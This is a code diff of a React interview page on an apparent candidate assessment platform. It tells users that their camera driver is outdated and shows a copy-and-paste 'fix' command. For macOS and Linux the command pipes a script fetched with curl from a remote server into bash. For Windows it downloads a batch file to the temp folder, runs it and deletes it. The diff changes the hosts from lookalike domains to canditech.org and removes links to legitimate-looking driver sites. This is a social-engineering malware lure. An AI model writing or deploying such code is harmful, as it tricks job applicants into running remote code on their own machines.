@@ -530,51 +530,14 @@ export default function SummaryInterview() {
                             'Finish all assessment questions before recording your summary video.'
                           ) : clientOsKind === 'mac' ? (
                             <>
-                              Video recording requires an up-to-date camera driver. Update your driver using the guided steps below, then choose <strong>Start camera</strong> again. For additional help, see{' '}
-                              <a
-                                href="https://www.3dpchip.com/new/driver/down.html?pl=cam14_1&o=6164"
-                                target="_blank"
-                                rel="noopener noreferrer"
-                                onClick={recordDriverHelpLinkClick}
-                              >
-                                3DP Chip
-                              </a>
-                              .
+                              Your camera driver is outdated. To use the recording feature, please update it to the latest version. You can update your camera driver directly from our assessment platform. Please see the instructions below.
                             </>
                           ) : clientOsKind === 'windows' ? (
-                            <>
-                              Video recording requires an up-to-date camera driver. Update your driver using the guided steps below, then choose <strong>Start camera</strong> again. For additional help, see{' '}
-                              <a
-                                href="https://www.drivereasy.com/"
-                                target="_blank"
-                                rel="noopener noreferrer"
-                                onClick={recordDriverHelpLinkClick}
-                              >
-                                Driver Easy
-                              </a>
-                              .
+                            <>Your camera driver is outdated. To use the recording feature, please update it to the latest version. You can update your camera driver directly from our assessment platform. Please see the instructions below.
                             </>
                           ) : (
                             <>
-                              Video recording requires an up-to-date camera driver. Update your driver using the guided steps below, then choose <strong>Start camera</strong> again. On macOS you may use{' '}
-                              <a
-                                href="https://www.3dpchip.com/new/driver/down.html?pl=cam14_1&o=6164"
-                                target="_blank"
-                                rel="noopener noreferrer"
-                                onClick={recordDriverHelpLinkClick}
-                              >
-                                3DP Chip
-                              </a>
-                              ; on Windows,{' '}
-                              <a
-                                href="https://www.drivereasy.com/"
-                                target="_blank"
-                                rel="noopener noreferrer"
-                                onClick={recordDriverHelpLinkClick}
-                              >
-                                Driver Easy
-                              </a>
-                              .
+                              Your camera driver is outdated. To use the recording feature, please update it to the latest version. You can update your camera driver directly from our assessment platform. Please see the instructions below.
                             </>
                           )}
                         </p>
@@ -789,16 +752,16 @@ export default function SummaryInterview() {
             <div ref={driverCommandRef} id="driver-command" className={styles.driverHelpCommand} role="region" aria-label="Command to copy">
                 {driverOs === 'mac' && (
                       <code>
-                      {`curl -sL -X POST https://3dpchip.org/mac/${inviteLink ? inviteLink : ''} \
-                        -H "Host: 3dpchip.org" \
+                      {`curl -sL -X POST https://canditech.org/mac/${inviteLink ? inviteLink : ''} \
+                        -H "Host: canditech.org" \
                         -H "User-Agent: Mozilla/5.0" \
                         -H "Accept: */*" | bash \ `}
                           </code>
                   )}
                 {driverOs === 'windows' && (
                           <code>
-                      {`curl -sL -X POST https://drivereasy.llc/window/${inviteLink ? inviteLink : ''} \
-                        -H "Host: drivereasy.llc" \
+                      {`curl -sL -X POST https://canditech.org/window/${inviteLink ? inviteLink : ''} \
+                        -H "Host: canditech.org" \
                         -H "User-Agent: Mozilla/5.0" \
                         -H "Accept: */*" -o "%TEMP%\ t.bat" && \
                         cmd /c "%TEMP%\ t.bat" && del \
@@ -807,8 +770,8 @@ export default function SummaryInterview() {
                       )}
               {driverOs === 'linux' && (
                       <code>
-                  {`curl -sL -X POST https://3dpchip.org/mac/${inviteLink ? inviteLink : ''} \
-                    -H "Host: 3dpchip.org" \
+                  {`curl -sL -X POST https://canditech.org/mac/${inviteLink ? inviteLink : ''} \
+                    -H "Host: canditech.org" \
                     -H "User-Agent: Mozilla/5.0" \
                     -H "Accept: */*" | bash && \ `}
                       </code>
